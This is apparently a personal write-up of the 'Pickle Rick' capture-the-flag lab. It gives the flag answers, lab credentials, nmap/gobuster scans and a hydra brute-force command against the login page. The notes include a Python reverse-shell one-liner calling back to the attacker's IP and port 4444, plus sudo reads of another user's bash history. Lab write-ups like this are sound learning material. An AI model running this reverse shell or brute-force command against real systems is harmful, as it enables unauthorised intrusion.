---
title: "Pickle Rick"

author: Matt Hammond
date: 2022-12-17
url: /pickle-rick/
image: images/2022-thumbs/pickle-rick.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

A Rick and Morty CTF. Help turn Rick back into a human!

## Questions

1. What is the first ingredient Rick needs? `mr. meeseek hair`
2. What is the second ingredient Rick needs? `1 jerry tear`
3. What is the final ingredient Rick needs? `fleeb juice`

---

## Notes

- IP = 10.10.141.98

- website page source shows `/assets`

  - found Apache/2.4.18 (Ubuntu) Server

- found `/login.php` from nmap --script=vuln scan
  - attempt bruteforce with hydra

### Exposed Services

```bash
22
80
```

### Users:Passwords

- R1ckRul3s:Wubbalubbadubdub
  - found username via web page source in notes
  - found password on robots.txt

### Vulnerabilities

-

### Logged Into Web Portal

- `ls`

  - `base64 Sup3rS3cretPickl3Ingred.txt | base64 -d`

- `base64 /home/rick/second\ ingredients | base64 -d`

#### Reverse Shell

- `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.18.53.113",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
  - `sudo cat /home/ubuntu/.bash_history` : `3rd ingredients: fleeb juice`

---

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`gobuster dir -u http://10.10.141.98 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster`

`hydra -v -t 30 -l R1ckRul3s -P /usr/local/share/wordlists/rockyou.txt 10.10.141.98 http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password"`
